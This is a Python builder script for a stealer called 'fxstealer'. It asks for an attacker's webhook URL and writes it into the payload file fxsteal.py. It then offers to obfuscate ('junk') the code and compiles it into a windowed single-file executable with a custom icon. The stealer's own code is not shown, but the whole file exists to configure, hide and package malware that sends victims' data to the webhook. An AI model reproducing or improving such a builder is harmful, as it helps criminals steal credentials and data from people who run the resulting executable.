from pystyle import *
import os
import subprocess
import requests
from colorama import *
import time

os.system('clear' if os.name == 'posix' else 'cls')

intro = """

   __             _                _             
  / _|           | |              | |            
 | |_ __  __ ___ | |_  ___   __ _ | |  ___  _ __ 
 |  _|\ \/ // __|| __|/ _ \ / _` || | / _ \| '__|
 | |   >  < \__ \| |_|  __/| (_| || ||  __/| |   
 |_|  /_/\_\|___/ \__|\___| \__,_||_| \___||_|   
                                                 
                                                 

                > Press Enter                                         

"""

Anime.Fade(Center.Center(intro), Colors.black_to_red, Colorate.Vertical, interval=0.035, enter=True)


print(f"""{Fore.LIGHTRED_EX}

   __             _                _             
  / _|           | |              | |            
 | |_ __  __ ___ | |_  ___   __ _ | |  ___  _ __ 
 |  _|\ \/ // __|| __|/ _ \ / _` || | / _ \| '__|
 | |   >  < \__ \| |_|  __/| (_| || ||  __/| |   
 |_|  /_/\_\|___/ \__|\___| \__,_||_| \___||_|   
                                                 
                                                 

            Welcome to builder

""")

time.sleep(1)


while True:
    
    Write.Print("\nWhich option do you want to choose: ", Colors.red_to_yellow)
    Write.Print("\n1. Build Exe", Colors.red_to_yellow)
    Write.Print("\n2. Close", Colors.red_to_yellow)
    Write.Print("\nMake your selection: ", Colors.red_to_yellow, end="")
    choice = input()

    if choice == "1":
        os.system("cls || clear")
        webhook = input(Fore.CYAN + "\nEnter Your Webhook: " + Style.RESET_ALL)

        filename = "fxsteal.py"
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        new_content = content.replace('"WEBHOOK HERE"', f'"{webhook}"')
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(new_content)
        Write.Print(f"\n{filename} file updated.", Colors.red_to_yellow)

        obfuscate = False
        while True:
            answer = input(Fore.CYAN + "\nDo you want to junk your code? (Recommended) (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                os.system("python junk.py")
                Write.Print(f"\n{filename} The file has been junked.", Colors.red_to_yellow)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)

        while True:
            answer = input(Fore.CYAN + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                if not obfuscate:
                    cmd = f"pyinstaller --onefile --windowed {filename} --icon icon.ico"
                else:
                    cmd = f"pyinstaller --onefile --windowed {filename} --name {filename.split('.')[0]} --icon icon.ico"
                subprocess.call(cmd, shell=True)
                Write.Print(f"\n{filename} The file has been converted to exe.", Colors.red_to_yellow)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)

    elif choice == "2":
        Write.Print("\nExiting the program...", Colors.red_to_yellow)
        break

    else:
        Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)
